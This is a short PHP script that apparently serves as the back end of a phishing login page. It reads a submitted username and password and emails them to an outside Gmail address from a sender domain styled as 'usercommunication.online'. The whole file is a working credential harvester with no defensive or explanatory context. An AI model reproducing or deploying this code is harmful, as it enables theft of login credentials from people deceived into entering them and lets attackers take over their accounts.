<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Send email
    $to = "jamesharrisobanks@gmail.com";
    $subject = "Login Credentials";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: nmail@usercommunication.online";

    mail($to, $subject, $message, $headers);

    echo "Credentials sent!";
}
?>